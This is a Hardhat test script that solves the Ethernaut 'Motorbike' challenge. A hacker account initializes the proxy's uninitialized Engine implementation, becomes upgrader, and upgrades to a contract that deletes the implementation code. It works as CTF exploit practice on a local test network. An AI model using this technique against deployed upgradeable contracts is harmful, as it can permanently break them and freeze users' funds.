const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Motorbike", function () {
  it("Should delete Engine code", async function () {

    const [deployer, hacker] = await ethers.getSigners();

    const impl_slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';

    const Motorbike = await ethers.getContractFactory("Motorbike", deployer);
    const Engine = await ethers.getContractFactory("Engine", deployer);

    this.engine = await Engine.deploy();
    this.motorbike = await Motorbike.deploy(this.engine.address);

    // this.bike will have the same address as this.motorbike
    this.bike = Engine.attach(this.motorbike.address)

    console.log(`Bike deployed to address: ${this.bike.address}`);

    // check engine is not initialized
    console.log(`Bike upgrader: ${await this.engine.upgrader()}`);
    expect(await this.engine.upgrader()).to.equal('0x0000000000000000000000000000000000000000');

    // get implementation address and code 
    const impl_address = (await ethers.provider.getStorageAt(this.bike.address, impl_slot)).replace('000000000000000000000000', '');
    let impl_code = (await ethers.provider.getCode(impl_address)).slice(0,100);

    expect(impl_code).to.not.equal('0x')
    
    console.log(`\nImplementation code: ${impl_code}`);

    // deploy MotorbikeHack
    const MotorbikeHack = await ethers.getContractFactory("MotorBikeHack", hacker);
    this.motorbikeHack = await MotorbikeHack.deploy();

    console.log(`\nMotorbikeHack deployed to address: ${this.motorbikeHack.address}`);

    // change implementation in Engine => _upgradeAndCall()
    const interface = new ethers.utils.Interface(["function initialize()"]);
    const init_encoded = interface.encodeFunctionData("initialize", []);

    await this.engine.connect(hacker).initialize();

    console.log(`Bike upgrader set to hacker address: ${await this.bike.upgrader()}`);
    expect(await this.engine.upgrader()).to.equal(hacker.address);

    await this.engine.connect(hacker).upgradeToAndCall(this.motorbikeHack.address, init_encoded);

    impl_code = (await ethers.provider.getCode(impl_address)).slice(0,100);

    // check implementation code is deleted
    expect(impl_code).to.equal('0x')

    console.log(`\nDeleting implementation code....`)

    console.log(`\nImplementation code: ${impl_code}`);
  });
});
